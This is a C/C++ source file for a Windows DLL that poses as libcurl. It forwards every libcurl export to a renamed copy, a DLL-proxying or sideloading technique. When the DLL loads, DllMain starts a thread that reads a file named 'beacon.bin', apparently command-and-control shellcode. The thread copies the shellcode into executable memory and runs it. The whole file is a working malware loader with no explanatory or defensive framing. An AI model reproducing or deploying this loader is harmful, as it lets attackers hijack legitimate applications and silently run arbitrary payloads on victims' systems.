#include "pch.h"
#include <stdio.h>
#include <stdlib.h>

#define _CRT_SECURE_NO_DEPRECATE
#pragma warning (disable : 4996)

#pragma comment(linker, "/export:curl_easy_cleanup=libcurl1.curl_easy_cleanup,@1")
#pragma comment(linker, "/export:curl_easy_duphandle=libcurl1.curl_easy_duphandle,@2")
#pragma comment(linker, "/export:curl_easy_escape=libcurl1.curl_easy_escape,@3")
#pragma comment(linker, "/export:curl_easy_getinfo=libcurl1.curl_easy_getinfo,@4")
#pragma comment(linker, "/export:curl_easy_init=libcurl1.curl_easy_init,@5")
#pragma comment(linker, "/export:curl_easy_pause=libcurl1.curl_easy_pause,@6")
#pragma comment(linker, "/export:curl_easy_perform=libcurl1.curl_easy_perform,@7")
#pragma comment(linker, "/export:curl_easy_recv=libcurl1.curl_easy_recv,@8")
#pragma comment(linker, "/export:curl_easy_reset=libcurl1.curl_easy_reset,@9")
#pragma comment(linker, "/export:curl_easy_send=libcurl1.curl_easy_send,@10")
#pragma comment(linker, "/export:curl_easy_setopt=libcurl1.curl_easy_setopt,@11")
#pragma comment(linker, "/export:curl_easy_strerror=libcurl1.curl_easy_strerror,@12")
#pragma comment(linker, "/export:curl_easy_unescape=libcurl1.curl_easy_unescape,@13")
#pragma comment(linker, "/export:curl_escape=libcurl1.curl_escape,@14")
#pragma comment(linker, "/export:curl_formadd=libcurl1.curl_formadd,@15")
#pragma comment(linker, "/export:curl_formfree=libcurl1.curl_formfree,@16")
#pragma comment(linker, "/export:curl_formget=libcurl1.curl_formget,@17")
#pragma comment(linker, "/export:curl_free=libcurl1.curl_free,@18")
#pragma comment(linker, "/export:curl_getdate=libcurl1.curl_getdate,@19")
#pragma comment(linker, "/export:curl_getenv=libcurl1.curl_getenv,@20")
#pragma comment(linker, "/export:curl_global_cleanup=libcurl1.curl_global_cleanup,@21")
#pragma comment(linker, "/export:curl_global_init=libcurl1.curl_global_init,@22")
#pragma comment(linker, "/export:curl_global_init_mem=libcurl1.curl_global_init_mem,@23")
#pragma comment(linker, "/export:curl_global_sslset=libcurl1.curl_global_sslset,@24")
#pragma comment(linker, "/export:curl_maprintf=libcurl1.curl_maprintf,@25")
#pragma comment(linker, "/export:curl_mfprintf=libcurl1.curl_mfprintf,@26")
#pragma comment(linker, "/export:curl_mime_addpart=libcurl1.curl_mime_addpart,@27")
#pragma comment(linker, "/export:curl_mime_data=libcurl1.curl_mime_data,@28")
#pragma comment(linker, "/export:curl_mime_data_cb=libcurl1.curl_mime_data_cb,@29")
#pragma comment(linker, "/export:curl_mime_encoder=libcurl1.curl_mime_encoder,@30")
#pragma comment(linker, "/export:curl_mime_filedata=libcurl1.curl_mime_filedata,@31")
#pragma comment(linker, "/export:curl_mime_filename=libcurl1.curl_mime_filename,@32")
#pragma comment(linker, "/export:curl_mime_free=libcurl1.curl_mime_free,@33")
#pragma comment(linker, "/export:curl_mime_headers=libcurl1.curl_mime_headers,@34")
#pragma comment(linker, "/export:curl_mime_init=libcurl1.curl_mime_init,@35")
#pragma comment(linker, "/export:curl_mime_name=libcurl1.curl_mime_name,@36")
#pragma comment(linker, "/export:curl_mime_subparts=libcurl1.curl_mime_subparts,@37")
#pragma comment(linker, "/export:curl_mime_type=libcurl1.curl_mime_type,@38")
#pragma comment(linker, "/export:curl_mprintf=libcurl1.curl_mprintf,@39")
#pragma comment(linker, "/export:curl_msnprintf=libcurl1.curl_msnprintf,@40")
#pragma comment(linker, "/export:curl_msprintf=libcurl1.curl_msprintf,@41")
#pragma comment(linker, "/export:curl_multi_add_handle=libcurl1.curl_multi_add_handle,@42")
#pragma comment(linker, "/export:curl_multi_assign=libcurl1.curl_multi_assign,@43")
#pragma comment(linker, "/export:curl_multi_cleanup=libcurl1.curl_multi_cleanup,@44")
#pragma comment(linker, "/export:curl_multi_fdset=libcurl1.curl_multi_fdset,@45")
#pragma comment(linker, "/export:curl_multi_info_read=libcurl1.curl_multi_info_read,@46")
#pragma comment(linker, "/export:curl_multi_init=libcurl1.curl_multi_init,@47")
#pragma comment(linker, "/export:curl_multi_perform=libcurl1.curl_multi_perform,@48")
#pragma comment(linker, "/export:curl_multi_remove_handle=libcurl1.curl_multi_remove_handle,@49")
#pragma comment(linker, "/export:curl_multi_setopt=libcurl1.curl_multi_setopt,@50")
#pragma comment(linker, "/export:curl_multi_socket=libcurl1.curl_multi_socket,@51")
#pragma comment(linker, "/export:curl_multi_socket_action=libcurl1.curl_multi_socket_action,@52")
#pragma comment(linker, "/export:curl_multi_socket_all=libcurl1.curl_multi_socket_all,@53")
#pragma comment(linker, "/export:curl_multi_strerror=libcurl1.curl_multi_strerror,@54")
#pragma comment(linker, "/export:curl_multi_timeout=libcurl1.curl_multi_timeout,@55")
#pragma comment(linker, "/export:curl_multi_wait=libcurl1.curl_multi_wait,@56")
#pragma comment(linker, "/export:curl_mvaprintf=libcurl1.curl_mvaprintf,@57")
#pragma comment(linker, "/export:curl_mvfprintf=libcurl1.curl_mvfprintf,@58")
#pragma comment(linker, "/export:curl_mvprintf=libcurl1.curl_mvprintf,@59")
#pragma comment(linker, "/export:curl_mvsnprintf=libcurl1.curl_mvsnprintf,@60")
#pragma comment(linker, "/export:curl_mvsprintf=libcurl1.curl_mvsprintf,@61")
#pragma comment(linker, "/export:curl_pushheader_byname=libcurl1.curl_pushheader_byname,@62")
#pragma comment(linker, "/export:curl_pushheader_bynum=libcurl1.curl_pushheader_bynum,@63")
#pragma comment(linker, "/export:curl_share_cleanup=libcurl1.curl_share_cleanup,@64")
#pragma comment(linker, "/export:curl_share_init=libcurl1.curl_share_init,@65")
#pragma comment(linker, "/export:curl_share_setopt=libcurl1.curl_share_setopt,@66")
#pragma comment(linker, "/export:curl_share_strerror=libcurl1.curl_share_strerror,@67")
#pragma comment(linker, "/export:curl_slist_append=libcurl1.curl_slist_append,@68")
#pragma comment(linker, "/export:curl_slist_free_all=libcurl1.curl_slist_free_all,@69")
#pragma comment(linker, "/export:curl_strequal=libcurl1.curl_strequal,@70")
#pragma comment(linker, "/export:curl_strnequal=libcurl1.curl_strnequal,@71")
#pragma comment(linker, "/export:curl_unescape=libcurl1.curl_unescape,@72")
#pragma comment(linker, "/export:curl_version=libcurl1.curl_version,@73")
#pragma comment(linker, "/export:curl_version_info=libcurl1.curl_version_info,@74")
//#pragma comment(linker, "/export:DoMagic=DoMagic,@75")

DWORD WINAPI DoMagic(LPVOID lpParameter)
{
        FILE* fp;
        size_t size;
        unsigned char* buffer;

        fp = fopen("beacon.bin", "rb");
        fseek(fp, 0, SEEK_END);
        size = ftell(fp);
        fseek(fp, 0, SEEK_SET);
        buffer = (unsigned char*)malloc(size);

        fread(buffer, size, 1, fp);

        void* exec = VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        memcpy(exec, buffer, size);

        ((void(*) ())exec)();

        return 0;
}
BOOL APIENTRY DllMain(HMODULE hModule, 
    DWORD ul_reason_for_call,
    LPVOID lpReserved
    )
{
    HANDLE threadHandle;

    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        threadHandle = CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);
        CloseHandle(threadHandle);
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

